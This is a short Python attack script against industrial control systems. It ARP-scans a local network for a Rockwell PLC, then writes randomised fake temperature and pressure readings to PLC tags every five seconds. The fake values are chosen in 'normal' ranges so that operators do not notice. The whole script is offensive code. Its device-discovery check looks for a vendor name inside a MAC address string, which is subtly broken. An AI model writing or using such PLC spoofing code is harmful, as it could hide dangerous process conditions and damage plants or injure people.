from scapy.all import ARP, Ether, srp
from pylogix import PLC
import random
import time

# Step 1: Function to Discover the PLC's IP Address via ARP Scan
def find_plc_ip():
    target_ip_range = "192.168.1.1/24"  # Change this based on your network configuration
    arp_request = ARP(pdst=target_ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for sent, received in answered_list:
        if "Rockwell" in received.hwsrc:  # This filters based on Rockwell device MAC prefix
            return received.psrc  # Return the discovered IP address
    
    return None  # Return None if no PLC is found

# Step 2: Function to Spoof Reporting Messages (Falsified I/O values)
def spoof_reporting(plc_ip):
    with PLC() as comm:
        comm.IPAddress = plc_ip

        while True:
            # Example Spoof Data (Falsifying Sensor and Process Values)
            fake_temperature = random.uniform(25.0, 26.0)  # Normal Range (Avoid detection)
            fake_pressure = random.uniform(1.0, 1.05)

            # Writing Fake Data to the PLC (Tag Names are Examples - Adjust Accordingly)
            comm.Write('Temperature_Sensor', fake_temperature)  
            comm.Write('Pressure_Sensor', fake_pressure)

            print(f"Sent Spoofed Data -> Temp: {fake_temperature} °C, Pressure: {fake_pressure} Bar")

            time.sleep(5)  # Spoof data every 5 seconds (Adjust as needed)

# Step 3: Execute the Attack - Find PLC and Then Spoof
if __name__ == "__main__":
    print("[*] Searching for PLC IP Address...")
    plc_ip = find_plc_ip()

    if plc_ip:
        print(f"[+] PLC Found at {plc_ip}")
        spoof_reporting(plc_ip)
    else:
        print("[-] No Rockwell PLC found on the network.")